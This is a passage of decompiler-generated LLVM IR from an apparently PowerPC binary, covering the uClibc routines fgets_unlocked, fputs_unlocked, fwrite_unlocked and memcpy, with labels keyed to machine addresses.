  store i32 %v2_1000e244, i32* @r3, align 4
  %v0_1000e34c = call i32 @__pthread_return_void()
  br label %dec_label_pc_1000e350

dec_label_pc_1000e350:                            ; preds = %dec_label_pc_1000e334, %dec_label_pc_1000e2bc, %dec_label_pc_1000e344
  %v0_1000e350 = load i32, i32* @r31, align 4
  %v1_1000e350 = add i32 %v0_1000e350, 32
  %v2_1000e350 = inttoptr i32 %v1_1000e350 to i32*
  %v3_1000e350 = load i32, i32* %v2_1000e350, align 4
  store i32 %v3_1000e350, i32* @r31, align 4
  %v3_1000e354 = icmp eq i32 %v3_1000e350, 0
  br i1 %v3_1000e354, label %dec_label_pc_1000e35c, label %dec_label_pc_1000e2bc

dec_label_pc_1000e35c:                            ; preds = %dec_label_pc_1000e350, %dec_label_pc_1000e238
  store i32 ptrtoint (i32* @global_var_1000e360.615 to i32), i32* @lr, align 4
  %v0_1000e35c = call i32 @_stdio_openlist_dec_use()
  br label %dec_label_pc_1000e39c

dec_label_pc_1000e364:                            ; preds = %dec_label_pc_1000e22c
  %v3_1000e364 = load i16, i16* %arg1, align 2
  %v4_1000e364 = zext i16 %v3_1000e364 to i32
  store i32 0, i32* @r28, align 4
  %v1_1000e36c = and i32 %v4_1000e364, 64
  store i32 %v1_1000e36c, i32* %r9.global-to-local, align 4
  %v3_1000e36c = icmp eq i32 %v1_1000e36c, 0
  br i1 %v3_1000e36c, label %dec_label_pc_1000e39c, label %dec_label_pc_1000e374

dec_label_pc_1000e374:                            ; preds = %dec_label_pc_1000e364
  store i32 268493688, i32* @lr, align 4
  %v0_1000e374 = call i32 @__stdio_wcommit()
  store i32 -1, i32* @r28, align 4
  %v3_1000e37c = icmp eq i32 %v0_1000e374, 0
  br i1 %v3_1000e37c, label %dec_label_pc_1000e384, label %dec_label_pc_1000e39c

dec_label_pc_1000e384:                            ; preds = %dec_label_pc_1000e374
  %v0_1000e384 = load i32, i32* @r29, align 4
  %v1_1000e384 = inttoptr i32 %v0_1000e384 to i16*
  %v2_1000e384 = load i16, i16* %v1_1000e384, align 2
  %v3_1000e384 = zext i16 %v2_1000e384 to i32
  store i32 0, i32* @r28, align 4
  %v1_1000e38c = add i32 %v0_1000e384, 8
  %v2_1000e38c = inttoptr i32 %v1_1000e38c to i32*
  %v3_1000e38c = load i32, i32* %v2_1000e38c, align 4
  store i32 %v3_1000e38c, i32* %r9.global-to-local, align 4
  %v1_1000e390 = call i32 @__asm_rlwinm(i32 %v3_1000e384, i32 0, i32 26, i32 24)
  %v2_1000e390 = trunc i32 %v1_1000e390 to i16
  %v3_1000e394 = load i32, i32* @r29, align 4
  %v4_1000e394 = inttoptr i32 %v3_1000e394 to i16*
  store i16 %v2_1000e390, i16* %v4_1000e394, align 2
  %v0_1000e398 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000e398 = load i32, i32* @r29, align 4
  %v2_1000e398 = add i32 %v1_1000e398, 28
  %v3_1000e398 = inttoptr i32 %v2_1000e398 to i32*
  store i32 %v0_1000e398, i32* %v3_1000e398, align 4
  br label %dec_label_pc_1000e39c

dec_label_pc_1000e39c:                            ; preds = %dec_label_pc_1000e374, %dec_label_pc_1000e364, %dec_label_pc_1000e35c, %dec_label_pc_1000e384
  %v0_1000e3a0 = load i32, i32* @r28, align 4
  ret i32 %v0_1000e3a0

; uselistorder directives
  uselistorder i32 %v3_1000e350, { 1, 2, 0 }
  uselistorder i32 %v1_1000e300, { 1, 0 }
  uselistorder i32 %v2_1000e244, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %r9.global-to-local, { 0, 1, 2, 3, 4, 5, 7, 6, 8, 9, 10, 11 }
  uselistorder i32* bitcast (i32** @global_var_10028598.592 to i32*), { 3, 4, 0, 1, 2, 5, 6 }
  uselistorder i32* @global_var_100285e8.586, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i16* %arg1, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_1000e39c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1000e350, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000e334, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000e2f4, { 1, 0 }
  uselistorder label %dec_label_pc_1000e2bc, { 1, 0 }
}

define i32 @__GI_fgets_unlocked(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cr6_eq.global-to-local = alloca i1, align 1
  %cr7_eq.global-to-local = alloca i1, align 1
  %r11.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %arg2, i32* @r29, align 4
  store i32 %tmp, i32* @r28, align 4
  store i32 %arg3, i32* @r30, align 4
  %tmp19 = icmp slt i32 %arg2, 1
  br i1 %tmp19, label %dec_label_pc_1000e45c, label %dec_label_pc_1000e3d4

dec_label_pc_1000e3d4:                            ; preds = %entry
  store i32 %tmp, i32* @r31, align 4
  %v2_1000e43c3 = add i32 %arg2, -1
  store i32 %v2_1000e43c3, i32* @r29, align 4
  %v4_1000e4449 = icmp eq i32 %arg2, 1
  br i1 %v4_1000e4449, label %dec_label_pc_1000e448, label %dec_label_pc_1000e3dc

dec_label_pc_1000e3dc:                            ; preds = %dec_label_pc_1000e3d4, %dec_label_pc_1000e43c.backedge
  %v2_1000e3f8 = phi i32 [ %v2_1000e3f812, %dec_label_pc_1000e43c.backedge ], [ %tmp, %dec_label_pc_1000e3d4 ]
  %v0_1000e3dc = phi i32 [ %v0_1000e440, %dec_label_pc_1000e43c.backedge ], [ %arg3, %dec_label_pc_1000e3d4 ]
  %v1_1000e3dc = add i32 %v0_1000e3dc, 16
  %v2_1000e3dc = inttoptr i32 %v1_1000e3dc to i32*
  %v3_1000e3dc = load i32, i32* %v2_1000e3dc, align 4
  %v1_1000e3e0 = add i32 %v0_1000e3dc, 24
  %v2_1000e3e0 = inttoptr i32 %v1_1000e3e0 to i32*
  %v3_1000e3e0 = load i32, i32* %v2_1000e3e0, align 4
  %v2_1000e3e4 = add i32 %v3_1000e3dc, 1
  store i32 %v2_1000e3e4, i32* %r11.global-to-local, align 4
  %v3_1000e3e8 = icmp ult i32 %v3_1000e3dc, %v3_1000e3e0
  %v5_1000e3e8 = icmp eq i32 %v3_1000e3dc, %v3_1000e3e0
  store i1 %v5_1000e3e8, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000e3e8, label %dec_label_pc_1000e3f0, label %dec_label_pc_1000e40c

dec_label_pc_1000e3f0:                            ; preds = %dec_label_pc_1000e3dc
  %v4_1000e3dc = inttoptr i32 %v3_1000e3dc to i8*
  %v3_1000e3f0 = load i8, i8* %v4_1000e3dc, align 1
  %v3_1000e3f4 = icmp eq i8 %v3_1000e3f0, 10
  store i1 %v3_1000e3f4, i1* %cr7_eq.global-to-local, align 1
  %v3_1000e3f8 = inttoptr i32 %v2_1000e3f8 to i8*
  store i8 %v3_1000e3f0, i8* %v3_1000e3f8, align 1
  %v0_1000e3fc = load i32, i32* %r11.global-to-local, align 4
  %v1_1000e3fc = load i32, i32* @r30, align 4
  %v2_1000e3fc = add i32 %v1_1000e3fc, 16
  %v3_1000e3fc = inttoptr i32 %v2_1000e3fc to i32*
  store i32 %v0_1000e3fc, i32* %v3_1000e3fc, align 4
  %v0_1000e400 = load i32, i32* @r31, align 4
  %v1_1000e400 = add i32 %v0_1000e400, 1
  store i32 %v1_1000e400, i32* @r31, align 4
  %v0_1000e404 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000e404, label %dec_label_pc_1000e448, label %dec_label_pc_1000e43c.backedge

dec_label_pc_1000e40c:                            ; preds = %dec_label_pc_1000e3dc
  %v1_1000e44010 = inttoptr i32 %v0_1000e3dc to i16*
  store i32 268493840, i32* @lr, align 4
  %v5_1000e40c = call i32 @getc_unlocked(i16* %v1_1000e44010, i32 %v3_1000e3dc)
  %v6_1000e40c = trunc i32 %v5_1000e40c to i8
  %v4_1000e410 = icmp eq i8 %v6_1000e40c, -1
  store i1 %v4_1000e410, i1* %cr7_eq.global-to-local, align 1
  %v3_1000e418 = icmp eq i8 %v6_1000e40c, 10
  store i1 %v3_1000e418, i1* %cr6_eq.global-to-local, align 1
  br i1 %v4_1000e410, label %dec_label_pc_1000e420, label %dec_label_pc_1000e430

dec_label_pc_1000e420:                            ; preds = %dec_label_pc_1000e40c
  %v0_1000e420 = load i32, i32* @r30, align 4
  %v1_1000e420 = inttoptr i32 %v0_1000e420 to i16*
  %v2_1000e420 = load i16, i16* %v1_1000e420, align 2
  %v1_1000e424 = and i16 %v2_1000e420, 8
  %v3_1000e424 = icmp eq i16 %v1_1000e424, 0
  br i1 %v3_1000e424, label %dec_label_pc_1000e420.dec_label_pc_1000e448_crit_edge, label %dec_label_pc_1000e45c

dec_label_pc_1000e420.dec_label_pc_1000e448_crit_edge: ; preds = %dec_label_pc_1000e420
  %v0_1000e448.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000e448

dec_label_pc_1000e430:                            ; preds = %dec_label_pc_1000e40c
  %v3_1000e430 = load i32, i32* @r31, align 4
  %v4_1000e430 = inttoptr i32 %v3_1000e430 to i8*
  store i8 %v6_1000e40c, i8* %v4_1000e430, align 1
  %v0_1000e434 = load i32, i32* @r31, align 4
  %v1_1000e434 = add i32 %v0_1000e434, 1
  store i32 %v1_1000e434, i32* @r31, align 4
  %v0_1000e438 = load i1, i1* %cr6_eq.global-to-local, align 1
  br i1 %v0_1000e438, label %dec_label_pc_1000e448, label %dec_label_pc_1000e43c.backedge

dec_label_pc_1000e43c.backedge:                   ; preds = %dec_label_pc_1000e430, %dec_label_pc_1000e3f0
  %v2_1000e3f812 = phi i32 [ %v1_1000e434, %dec_label_pc_1000e430 ], [ %v1_1000e400, %dec_label_pc_1000e3f0 ]
  %v0_1000e43c = load i32, i32* @r29, align 4
  %v2_1000e43c = add i32 %v0_1000e43c, -1
  store i32 %v2_1000e43c, i32* @r29, align 4
  %v0_1000e440 = load i32, i32* @r30, align 4
  %v4_1000e444 = icmp eq i32 %v0_1000e43c, 1
  br i1 %v4_1000e444, label %dec_label_pc_1000e448, label %dec_label_pc_1000e3dc

dec_label_pc_1000e448:                            ; preds = %dec_label_pc_1000e430, %dec_label_pc_1000e43c.backedge, %dec_label_pc_1000e3f0, %dec_label_pc_1000e3d4, %dec_label_pc_1000e420.dec_label_pc_1000e448_crit_edge
  %v2_1000e454 = phi i32 [ %v0_1000e448.pre, %dec_label_pc_1000e420.dec_label_pc_1000e448_crit_edge ], [ %tmp, %dec_label_pc_1000e3d4 ], [ %v1_1000e400, %dec_label_pc_1000e3f0 ], [ %v2_1000e3f812, %dec_label_pc_1000e43c.backedge ], [ %v1_1000e434, %dec_label_pc_1000e430 ]
  %v1_1000e448 = load i32, i32* @r28, align 4
  %v3_1000e448 = icmp ugt i32 %v2_1000e454, %v1_1000e448
  %v4_1000e448 = icmp eq i32 %v2_1000e454, %v1_1000e448
  store i1 %v4_1000e448, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000e448, label %dec_label_pc_1000e450, label %dec_label_pc_1000e45c

dec_label_pc_1000e450:                            ; preds = %dec_label_pc_1000e448
  %v3_1000e454 = inttoptr i32 %v2_1000e454 to i8*
  store i8 0, i8* %v3_1000e454, align 1
  %v0_1000e464.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_1000e460

dec_label_pc_1000e45c:                            ; preds = %dec_label_pc_1000e420, %dec_label_pc_1000e448, %entry
  store i32 0, i32* @r28, align 4
  br label %dec_label_pc_1000e460

dec_label_pc_1000e460:                            ; preds = %dec_label_pc_1000e450, %dec_label_pc_1000e45c
  %v0_1000e464 = phi i32 [ %v0_1000e464.pre, %dec_label_pc_1000e450 ], [ 0, %dec_label_pc_1000e45c ]
  ret i32 %v0_1000e464

; uselistorder directives
  uselistorder i32 %v2_1000e454, { 0, 2, 1 }
  uselistorder i8 %v6_1000e40c, { 1, 0, 2 }
  uselistorder i32 %v3_1000e3e0, { 1, 0 }
  uselistorder i32 %v3_1000e3dc, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v0_1000e3dc, { 2, 1, 0 }
  uselistorder i32 %tmp, { 1, 0, 2, 3 }
  uselistorder i8 -1, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 %arg2, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_1000e460, { 1, 0 }
  uselistorder label %dec_label_pc_1000e45c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000e448, { 1, 0, 4, 2, 3 }
  uselistorder label %dec_label_pc_1000e3dc, { 1, 0 }
}

define i32 @__GI_fputs_unlocked(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r3, align 4
  %v0_1000e490 = call i32 @__GI_strlen()
  store i32 %v0_1000e490, i32* @r27, align 4
  store i32 ptrtoint (i32* @global_var_1000e4ac.616 to i32), i32* @lr, align 4
  %v4_1000e4a8 = inttoptr i32 %arg2 to i16*
  %v5_1000e4a8 = call i32 @__GI_fwrite_unlocked(i32 %arg1, i32 1, i32 %v0_1000e490, i16* %v4_1000e4a8)
  %v1_1000e4b0 = load i32, i32* @r27, align 4
  %v4_1000e4b0 = icmp eq i32 %v5_1000e4a8, %v1_1000e4b0
  br i1 %v4_1000e4b0, label %dec_label_pc_1000e4b8, label %dec_label_pc_1000e4bc

dec_label_pc_1000e4b8:                            ; preds = %entry
  br label %dec_label_pc_1000e4bc

dec_label_pc_1000e4bc:                            ; preds = %entry, %dec_label_pc_1000e4b8
  %v0_1000e4bc = phi i32 [ -1, %entry ], [ %v5_1000e4a8, %dec_label_pc_1000e4b8 ]
  ret i32 %v0_1000e4bc

; uselistorder directives
  uselistorder label %dec_label_pc_1000e4bc, { 1, 0 }
}

define i32 @__GI_fwrite_unlocked(i32 %arg1, i32 %arg2, i32 %arg3, i16* %arg4) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg4 to i32
  store i32 %arg2, i32* %r4.global-to-local, align 4
  store i32 %arg2, i32* @r29, align 4
  store i32 %arg1, i32* @r28, align 4
  %v3_1000e4ec = load i16, i16* %arg4, align 2
  %v4_1000e4ec = zext i16 %v3_1000e4ec to i32
  store i32 %tmp, i32* @r31, align 4
  store i32 128, i32* @r4, align 4
  store i32 %arg3, i32* @r30, align 4
  %v1_1000e4fc = call i32 @__asm_rlwinm(i32 %v4_1000e4ec, i32 0, i32 24, i32 25)
  %v3_1000e504 = icmp eq i32 %v1_1000e4fc, 192
  br i1 %v3_1000e504, label %dec_label_pc_1000e518, label %dec_label_pc_1000e50c

dec_label_pc_1000e50c:                            ; preds = %entry
  store i32 268494096, i32* @lr, align 4
  %v3_1000e50c = call i32 @__stdio_trans2w_o(i16* nonnull %arg4)
  %v3_1000e510 = icmp eq i32 %v3_1000e50c, 0
  br i1 %v3_1000e510, label %dec_label_pc_1000e518, label %dec_label_pc_1000e570

dec_label_pc_1000e518:                            ; preds = %dec_label_pc_1000e50c, %entry
  %v0_1000e518 = load i32, i32* @r29, align 4
  %v3_1000e518 = icmp eq i32 %v0_1000e518, 0
  %v0_1000e51c = load i32, i32* @r30, align 4
  %v3_1000e51c = icmp eq i32 %v0_1000e51c, 0
  %brmerge = or i1 %v3_1000e518, %v3_1000e51c
  br i1 %brmerge, label %dec_label_pc_1000e570, label %dec_label_pc_1000e528

dec_label_pc_1000e528:                            ; preds = %dec_label_pc_1000e518
  %v2_1000e530 = udiv i32 -1, %v0_1000e518
  %v0_1000e534 = load i32, i32* @r31, align 4
  %v3_1000e538 = icmp ugt i32 %v0_1000e51c, %v2_1000e530
  %v1_1000e550 = inttoptr i32 %v0_1000e534 to i16*
  br i1 %v3_1000e538, label %dec_label_pc_1000e550, label %dec_label_pc_1000e540

dec_label_pc_1000e540:                            ; preds = %dec_label_pc_1000e528
  %v0_1000e52c = load i32, i32* @r28, align 4
  %v2_1000e540 = mul i32 %v0_1000e51c, %v0_1000e518
  store i32 %v2_1000e540, i32* %r4.global-to-local, align 4
  store i32 268494152, i32* @lr, align 4
  %v5_1000e544 = call i32 @__stdio_fwrite(i32 %v0_1000e52c, i32 %v2_1000e540, i16* %v1_1000e550)
  %v1_1000e548 = load i32, i32* @r29, align 4
  %v2_1000e548 = udiv i32 %v5_1000e544, %v1_1000e548
  store i32 %v2_1000e548, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1000e574

dec_label_pc_1000e550:                            ; preds = %dec_label_pc_1000e528
  %v2_1000e550 = load i16, i16* %v1_1000e550, align 2
  %v1_1000e554 = or i16 %v2_1000e550, 8
  store i16 %v1_1000e554, i16* %v1_1000e550, align 2
  %v0_1000e55c = call i32 @__errno_location()
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_1000e568 = inttoptr i32 %v0_1000e55c to i32*
  store i32 22, i32* %v2_1000e568, align 4
  %v0_1000e578.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1000e574

dec_label_pc_1000e570:                            ; preds = %dec_label_pc_1000e518, %dec_label_pc_1000e50c
  store i32 0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1000e574

dec_label_pc_1000e574:                            ; preds = %dec_label_pc_1000e550, %dec_label_pc_1000e540, %dec_label_pc_1000e570
  %v0_1000e578 = phi i32 [ %v0_1000e578.pre, %dec_label_pc_1000e550 ], [ %v2_1000e548, %dec_label_pc_1000e540 ], [ 0, %dec_label_pc_1000e570 ]
  ret i32 %v0_1000e578

; uselistorder directives
  uselistorder i16* %v1_1000e550, { 1, 2, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 (i32, i32, i16*)* @__stdio_fwrite, { 1, 2, 3, 5, 6, 0, 4 }
  uselistorder label %dec_label_pc_1000e574, { 2, 0, 1 }
}

define i32 @memcpy() local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v0_1000e58c = load i32, i32* @r5, align 4
  %v1_1000e58c = call i32 @__asm_rlwinm.(i32 %v0_1000e58c, i32 29, i32 3, i32 31)
  store i32 %v1_1000e58c, i32* %r9.global-to-local, align 4
  %v4_1000e58c = icmp eq i32 %v1_1000e58c, 0
  store i1 false, i1* @cr0_so, align 1
  %v0_1000e590 = load i32, i32* @r4, align 4
  %v1_1000e590 = add i32 %v0_1000e590, -4
  store i32 %v1_1000e590, i32* %r4.global-to-local, align 4
  %v0_1000e594 = load i32, i32* @r3, align 4
  %v1_1000e594 = add i32 %v0_1000e594, -4
  store i32 %v1_1000e594, i32* @r11, align 4
  br i1 %v4_1000e58c, label %dec_label_pc_1000e5bc, label %dec_label_pc_1000e59c

dec_label_pc_1000e59c:                            ; preds = %entry
  %v1_1000e59c = urem i32 %v1_1000e594, 4
  %v3_1000e59c = icmp eq i32 %v1_1000e59c, 0
  store i1 false, i1* @cr0_so, align 1
  br i1 %v3_1000e59c, label %dec_label_pc_1000e5a4, label %dec_label_pc_1000e5f8

dec_label_pc_1000e5a4:                            ; preds = %dec_label_pc_1000e618.dec_label_pc_1000e5a4_crit_edge, %dec_label_pc_1000e59c
  %v1_1000e5b0.pre = phi i32 [ %v1_1000e594, %dec_label_pc_1000e59c ], [ %v1_1000e5b0.pre.pre, %dec_label_pc_1000e618.dec_label_pc_1000e5a4_crit_edge ]
  %v0_1000e5a4 = phi i32 [ %v1_1000e58c, %dec_label_pc_1000e59c ], [ %v1_1000e618, %dec_label_pc_1000e618.dec_label_pc_1000e5a4_crit_edge ]
  %.0 = phi i32 [ undef, %dec_label_pc_1000e59c ], [ %v2_1000e600, %dec_label_pc_1000e618.dec_label_pc_1000e5a4_crit_edge ]
  store i32 %v0_1000e5a4, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1000e5a8

dec_label_pc_1000e5a8:                            ; preds = %dec_label_pc_1000e5a8, %dec_label_pc_1000e5a4
  %v1_1000e5b0 = phi i32 [ %v2_1000e5b4, %dec_label_pc_1000e5a8 ], [ %v1_1000e5b0.pre, %dec_label_pc_1000e5a4 ]
  %v0_1000e5a8 = load i32, i32* %r4.global-to-local, align 4
  %v1_1000e5a8 = add i32 %v0_1000e5a8, 4
  %v2_1000e5a8 = inttoptr i32 %v1_1000e5a8 to i32*
  %v3_1000e5a8 = load i32, i32* %v2_1000e5a8, align 4
  %v1_1000e5ac = add i32 %v0_1000e5a8, 8
  %v2_1000e5ac = inttoptr i32 %v1_1000e5ac to i32*
  %v3_1000e5ac = load i32, i32* %v2_1000e5ac, align 4
  store i32 %v3_1000e5ac, i32* %r9.global-to-local, align 4
  store i32 %v1_1000e5ac, i32* %r4.global-to-local, align 4
  %v2_1000e5b0 = add i32 %v1_1000e5b0, 4
  %v3_1000e5b0 = inttoptr i32 %v2_1000e5b0 to i32*
  store i32 %v3_1000e5a8, i32* %v3_1000e5b0, align 4
  %v0_1000e5b4 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000e5b4 = load i32, i32* @r11, align 4
  %v2_1000e5b4 = add i32 %v1_1000e5b4, 8
  %v3_1000e5b4 = inttoptr i32 %v2_1000e5b4 to i32*
  store i32 %v0_1000e5b4, i32* %v3_1000e5b4, align 4
  store i32 %v2_1000e5b4, i32* @r11, align 4
  %v0_1000e5b8 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000e5b8 = add i32 %v0_1000e5b8, -1
  store i32 %v1_1000e5b8, i32* %ctr.global-to-local, align 4
  %v2_1000e5b8 = icmp eq i32 %v1_1000e5b8, 0
  br i1 %v2_1000e5b8, label %dec_label_pc_1000e5bc, label %dec_label_pc_1000e5a8

dec_label_pc_1000e5bc:                            ; preds = %dec_label_pc_1000e5a8, %dec_label_pc_1000e618, %entry
  %.1 = phi i32 [ undef, %entry ], [ %v2_1000e600, %dec_label_pc_1000e618 ], [ %.0, %dec_label_pc_1000e5a8 ]
  %v1_1000e5bc = urem i32 %.1, 8
  store i32 %v1_1000e5bc, i32* @r5, align 4
  %tmp = icmp ult i32 %v1_1000e5bc, 4
  br i1 %tmp, label %dec_label_pc_1000e5d4, label %dec_label_pc_1000e5c8

dec_label_pc_1000e5c8:                            ; preds = %dec_label_pc_1000e5bc
  %v0_1000e5c8 = load i32, i32* %r4.global-to-local, align 4
  %v1_1000e5c8 = add i32 %v0_1000e5c8, 4
  %v2_1000e5c8 = inttoptr i32 %v1_1000e5c8 to i32*
  %v3_1000e5c8 = load i32, i32* %v2_1000e5c8, align 4
  store i32 %v1_1000e5c8, i32* %r4.global-to-local, align 4
  %v1_1000e5cc = add nsw i32 %v1_1000e5bc, -4
  store i32 %v1_1000e5cc, i32* @r5, align 4
  %v1_1000e5d0 = load i32, i32* @r11, align 4
  %v2_1000e5d0 = add i32 %v1_1000e5d0, 4
  %v3_1000e5d0 = inttoptr i32 %v2_1000e5d0 to i32*
  store i32 %v3_1000e5c8, i32* %v3_1000e5d0, align 4
  store i32 %v2_1000e5d0, i32* @r11, align 4
  %v0_1000e5d4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1000e5d4

dec_label_pc_1000e5d4:                            ; preds = %dec_label_pc_1000e5bc, %dec_label_pc_1000e5c8
  %v0_1000e5d4 = phi i32 [ %v1_1000e5bc, %dec_label_pc_1000e5bc ], [ %v0_1000e5d4.pre, %dec_label_pc_1000e5c8 ]
  %v3_1000e5d4 = icmp eq i32 %v0_1000e5d4, 0
  %v0_1000e5d8 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000e5d4, i32 %v0_1000e5d8)
  %v0_1000e5dc = load i32, i32* @r5, align 4
  store i32 %v0_1000e5dc, i32* %ctr.global-to-local, align 4
  %v0_1000e5e0 = load i32, i32* %r4.global-to-local, align 4
  %v1_1000e5e0 = add i32 %v0_1000e5e0, 3
  store i32 %v1_1000e5e0, i32* %r4.global-to-local, align 4
  %v0_1000e5e4 = load i32, i32* @r11, align 4
  %v1_1000e5e4 = add i32 %v0_1000e5e4, 3
  store i32 %v1_1000e5e4, i32* %r9.global-to-local, align 4
  %v1_1000e5e89 = add i32 %v0_1000e5e0, 4
  %v2_1000e5e810 = inttoptr i32 %v1_1000e5e89 to i8*
  %v3_1000e5e811 = load i8, i8* %v2_1000e5e810, align 1
  store i32 %v1_1000e5e89, i32* %r4.global-to-local, align 4
  %v3_1000e5ec13 = add i32 %v0_1000e5e4, 4
  %v4_1000e5ec14 = inttoptr i32 %v3_1000e5ec13 to i8*
  store i8 %v3_1000e5e811, i8* %v4_1000e5ec14, align 1
  store i32 %v3_1000e5ec13, i32* %r9.global-to-local, align 4
  %v0_1000e5f015 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000e5f016 = add i32 %v0_1000e5f015, -1
  store i32 %v1_1000e5f016, i32* %ctr.global-to-local, align 4
  %v2_1000e5f017 = icmp eq i32 %v1_1000e5f016, 0
  br i1 %v2_1000e5f017, label %dec_label_pc_1000e624, label %dec_label_pc_1000e5e8.dec_label_pc_1000e5e8_crit_edge

dec_label_pc_1000e5e8.dec_label_pc_1000e5e8_crit_edge: ; preds = %dec_label_pc_1000e5d4, %dec_label_pc_1000e5e8.dec_label_pc_1000e5e8_crit_edge
  %v3_1000e5ec18 = phi i32 [ %v3_1000e5ec, %dec_label_pc_1000e5e8.dec_label_pc_1000e5e8_crit_edge ], [ %v3_1000e5ec13, %dec_label_pc_1000e5d4 ]
  %v0_1000e5e8.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_1000e5e8 = add i32 %v0_1000e5e8.pre, 1
  %v2_1000e5e8 = inttoptr i32 %v1_1000e5e8 to i8*
  %v3_1000e5e8 = load i8, i8* %v2_1000e5e8, align 1
  store i32 %v1_1000e5e8, i32* %r4.global-to-local, align 4
  %v3_1000e5ec = add i32 %v3_1000e5ec18, 1
  %v4_1000e5ec = inttoptr i32 %v3_1000e5ec to i8*
  store i8 %v3_1000e5e8, i8* %v4_1000e5ec, align 1
  store i32 %v3_1000e5ec, i32* %r9.global-to-local, align 4
  %v0_1000e5f0 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000e5f0 = add i32 %v0_1000e5f0, -1
  store i32 %v1_1000e5f0, i32* %ctr.global-to-local, align 4
  %v2_1000e5f0 = icmp eq i32 %v1_1000e5f0, 0
  br i1 %v2_1000e5f0, label %dec_label_pc_1000e624, label %dec_label_pc_1000e5e8.dec_label_pc_1000e5e8_crit_edge

dec_label_pc_1000e5f8:                            ; preds = %dec_label_pc_1000e59c
  %v1_1000e5f8 = sub nsw i32 4, %v1_1000e59c
  store i32 %v1_1000e5f8, i32* %ctr.global-to-local, align 4
  %v1_1000e600 = load i32, i32* @r5, align 4
  %v2_1000e600 = sub i32 %v1_1000e600, %v1_1000e5f8
  br label %dec_label_pc_1000e604

dec_label_pc_1000e604:                            ; preds = %dec_label_pc_1000e604.dec_label_pc_1000e604_crit_edge, %dec_label_pc_1000e5f8
  %v2_1000e60c = phi i32 [ %v1_1000e610, %dec_label_pc_1000e604.dec_label_pc_1000e604_crit_edge ], [ %v1_1000e594, %dec_label_pc_1000e5f8 ]
  %v0_1000e604 = phi i32 [ %v0_1000e604.pre, %dec_label_pc_1000e604.dec_label_pc_1000e604_crit_edge ], [ %v1_1000e590, %dec_label_pc_1000e5f8 ]
  %v1_1000e604 = add i32 %v0_1000e604, 4
  %v2_1000e604 = inttoptr i32 %v1_1000e604 to i8*
  %v3_1000e604 = load i8, i8* %v2_1000e604, align 1
  %v1_1000e608 = add i32 %v0_1000e604, 1
  store i32 %v1_1000e608, i32* %r4.global-to-local, align 4
  %v3_1000e60c = add i32 %v2_1000e60c, 4
  %v4_1000e60c = inttoptr i32 %v3_1000e60c to i8*
  store i8 %v3_1000e604, i8* %v4_1000e60c, align 1
  %v0_1000e610 = load i32, i32* @r11, align 4
  %v1_1000e610 = add i32 %v0_1000e610, 1
  store i32 %v1_1000e610, i32* @r11, align 4
  %v0_1000e614 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000e614 = add i32 %v0_1000e614, -1
  store i32 %v1_1000e614, i32* %ctr.global-to-local, align 4
  %v2_1000e614 = icmp eq i32 %v1_1000e614, 0
  br i1 %v2_1000e614, label %dec_label_pc_1000e618, label %dec_label_pc_1000e604.dec_label_pc_1000e604_crit_edge

dec_label_pc_1000e604.dec_label_pc_1000e604_crit_edge: ; preds = %dec_label_pc_1000e604
  %v0_1000e604.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1000e604

dec_label_pc_1000e618:                            ; preds = %dec_label_pc_1000e604
  %v1_1000e618 = call i32 @__asm_rlwinm.(i32 %v2_1000e600, i32 29, i32 3, i32 31)
  store i32 %v1_1000e618, i32* %r9.global-to-local, align 4
  %v4_1000e618 = icmp eq i32 %v1_1000e618, 0
  store i1 false, i1* @cr0_so, align 1
  br i1 %v4_1000e618, label %dec_label_pc_1000e5bc, label %dec_label_pc_1000e618.dec_label_pc_1000e5a4_crit_edge

dec_label_pc_1000e618.dec_label_pc_1000e5a4_crit_edge: ; preds = %dec_label_pc_1000e618
  %v1_1000e5b0.pre.pre = load i32, i32* @r11, align 4
  br label %dec_label_pc_1000e5a4

dec_label_pc_1000e624:                            ; preds = %dec_label_pc_1000e5e8.dec_label_pc_1000e5e8_crit_edge, %dec_label_pc_1000e5d4
  %v0_1000e624 = load i32, i32* @r3, align 4
  ret i32 %v0_1000e624

; uselistorder directives
  uselistorder i32 %v1_1000e618, { 1, 2, 0 }
  uselistorder i32 %v1_1000e614, { 1, 0 }
  uselistorder i32 %v1_1000e610, { 1, 0 }
  uselistorder i32 %v0_1000e604, { 1, 0 }
  uselistorder i32 %v2_1000e600, { 2, 1, 0 }
